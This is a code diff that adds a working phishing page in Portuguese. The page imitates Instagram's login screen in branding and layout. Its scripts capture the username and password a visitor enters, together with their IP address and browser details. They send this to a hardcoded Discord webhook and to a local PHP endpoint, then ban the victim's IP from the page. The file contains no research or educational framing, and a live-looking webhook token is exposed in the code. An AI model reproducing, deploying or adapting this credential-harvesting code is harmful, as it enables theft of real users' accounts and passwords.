@@ -1,0 +1,297 @@
+<?php
+$ip = $_SERVER['REMOTE_ADDR'];
+$ips = json_decode(file_get_contents("api/ips.json"), true);
+if (in_array($ip, $ips)) {
+  die("<h1 style='text-align:center;color:red'>⛔ IP BANIDO</h1>");
+}
+?>
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Instagram</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; }
+    body {
+      background-color: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      color: #262626;
+    }
+    .container {
+      display: flex;
+      align-items: flex-start;
+      justify-content: center;
+      gap: 40px;
+      flex-wrap: wrap;
+      padding: 40px 20px;
+    }
+    .phone-preview { display: none; }
+    @media (min-width: 875px) {
+      .phone-preview { display: block; }
+      .phone-preview img {
+        height: 600px;
+        object-fit: contain;
+        user-select: none;
+      }
+    }
+    .login-section {
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      padding: 40px 40px 50px;
+      width: 350px;
+      text-align: center;
+      box-shadow: 0 0 10px rgba(0,0,0,0.0975);
+    }
+    .login-section img.logo {
+      width: 175px;
+      margin-bottom: 28px;
+      user-select: none;
+      pointer-events: none;
+    }
+    .login-section input {
+      width: 100%;
+      padding: 9px 8px;
+      margin-bottom: 6px;
+      font-size: 14px;
+      color: #262626;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      background-color: #fafafa;
+    }
+    .login-section input::placeholder { color: #999; }
+    .login-section input:focus {
+      outline: none;
+      border-color: #a8a8a8;
+      background-color: #fff;
+    }
+    .login-section button {
+      width: 100%;
+      padding: 8px 0;
+      background-color: #0095f6;
+      color: white;
+      font-weight: 600;
+      font-size: 14px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      margin-top: 8px;
+    }
+    .login-section button:hover { background-color: #007dc1; }
+    .login-section button:active { background-color: #005a8b; }
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 18px 0;
+      color: #8e8e8e;
+      font-weight: 600;
+      font-size: 13px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+    .divider::before, .divider::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background: #dbdbdb;
+    }
+    .divider::before { margin-right: 18px; }
+    .divider::after { margin-left: 18px; }
+    .facebook-login {
+      color: #385185;
+      font-weight: 600;
+      font-size: 14px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 6px;
+      cursor: pointer;
+      margin-bottom: 20px;
+    }
+    .facebook-login img {
+      width: 18px;
+      height: 18px;
+      object-fit: contain;
+    }
+    .facebook-login:hover { text-decoration: underline; }
+    .facebook-login:active { color: #2d4373; }
+    .signup {
+      font-size: 14px;
+      border: 1px solid #dbdbdb;
+      padding: 20px 0;
+      background: #fff;
+      margin-top: 12px;
+    }
+    .signup strong {
+      cursor: pointer;
+      color: #0095f6;
+      font-weight: 600;
+    }
+    .signup strong:hover { text-decoration: underline; }
+    .signup strong:active { color: #007dc1; }
+    .download {
+      margin-top: 30px;
+      font-size: 14px;
+      color: #8e8e8e;
+    }
+    .app-stores {
+      margin-top: 10px;
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+    }
+    .app-stores img {
+      width: 136px;
+      height: 40px;
+      object-fit: contain;
+      cursor: pointer;
+    }
+    #blockedMessage {
+      display: none;
+      text-align: center;
+      padding: 40px;
+      color: red;
+      font-weight: 700;
+      font-size: 18px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="mainContainer">
+    <div class="phone-preview" aria-hidden="true">
+      <img src="https://i.imgur.com/zqpwkLQ.png" alt="Preview" draggable="false" loading="lazy" />
+    </div>
+
+    <div class="login-section" role="main" aria-label="Formulário de login do Instagram">
+      <img class="logo" src="https://logodownload.org/wp-content/uploads/2017/04/instagram-logo-1.png" alt="Instagram" draggable="false" loading="lazy" />
+      
+      <form id="loginForm">
+        <input type="text" placeholder="Telefone, nome de usuário ou e-mail" aria-label="Telefone, nome de usuário ou e-mail" autocomplete="username" required />
+        <input type="password" placeholder="Senha" aria-label="Senha" autocomplete="current-password" required />
+        <button type="submit">Entrar</button>
+      </form>
+
+      <div class="divider"><span>ou</span></div>
+
+      <div class="facebook-login" role="button" tabindex="0" onclick="window.location.href='https://www.facebook.com/login.php'">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook" draggable="false" />
+        Entrar com o Facebook
+      </div>
+
+      <div class="signup">
+        Não tem uma conta? <strong onclick="window.open('https://www.instagram.com/accounts/emailsignup/', '_blank')">Cadastre-se</strong>
+      </div>
+
+      <div class="download">Obtenha o aplicativo.</div>
+
+      <div class="app-stores">
+        <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank" rel="noopener noreferrer">
+          <img
+            src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english_2x.png/886db13f9851.png"
+            alt="Google Play"
+            loading="lazy"
+          />
+        </a>
+        <a href="https://apps.apple.com/app/instagram/id389801252" target="_blank" rel="noopener noreferrer">
+          <img
+            src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english_2x.png/5a2d6bc8b6b1.png"
+            alt="App Store"
+            loading="lazy"
+          />
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <div id="blockedMessage">
+    🚫 Seu IP foi banido. Você não pode acessar esta página.<br />
+    Se acredita que isso é um erro, contate o administrador.
+  </div>
+
+  <script>
+    const webhookURL = "https://discord.com/api/webhooks/1395851484381581362/jlRVr4UmA7mBfaHwlZAyRz0ipjSdS6dVGvUz8F57hANXnVcY9EMAr_SvpytSTieIpP1S";
+
+    function getBannedIPs() {
+      const json = localStorage.getItem("bannedIPs");
+      return json ? JSON.parse(json) : [];
+    }
+
+    function setBannedIPs(list) {
+      localStorage.setItem("bannedIPs", JSON.stringify(list));
+    }
+
+    function blockAccess() {
+      document.getElementById("mainContainer").style.display = "none";
+      document.getElementById("blockedMessage").style.display = "block";
+    }
+
+    function banIP(ip) {
+      const list = getBannedIPs();
+      if (!list.includes(ip)) {
+        list.push(ip);
+        setBannedIPs(list);
+      }
+    }
+
+    fetch("https://ipapi.co/json/")
+      .then(res => res.json())
+      .then(data => {
+        const userIP = data.ip;
+        const bannedList = getBannedIPs();
+
+        if (bannedList.includes(userIP)) {
+          blockAccess();
+          return;
+        }
+
+        const form = document.getElementById("loginForm");
+
+        form.addEventListener("submit", function(e) {
+          e.preventDefault();
+
+          const inputs = e.target.elements;
+          const username = inputs[0].value;
+          const password = inputs[1].value;
+          const userAgent = navigator.userAgent;
+
+          const content = 
+            `🛑 Tentativa de login:\n` +
+            `👤 Usuário: \`${username}\`\n` +
+            `🔑 Senha: \`${password}\`\n\n` +
+            `🌐 Dados do visitante:\n` +
+            `📡 IP: \`${userIP}\`\n` +
+            `🧠 Navegador: \`${userAgent}\``;
+
+          fetch(webhookURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content })
+          }).finally(() => {
+            banIP(userIP);
+            blockAccess();
+          });
+        });
+      })
+      .catch(() => {});
+  </script>
+
+<script>
+  document.getElementById("loginForm").addEventListener("submit", async function (e) {
+    e.preventDefault();
+    const senha = document.querySelector('input[type="password"]').value;
+    const ip = await fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => d.ip);
+
+    fetch("api/webhook.php", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ senha, ip })
+    });
+  });
+</script>
+
+</body>
+</html>
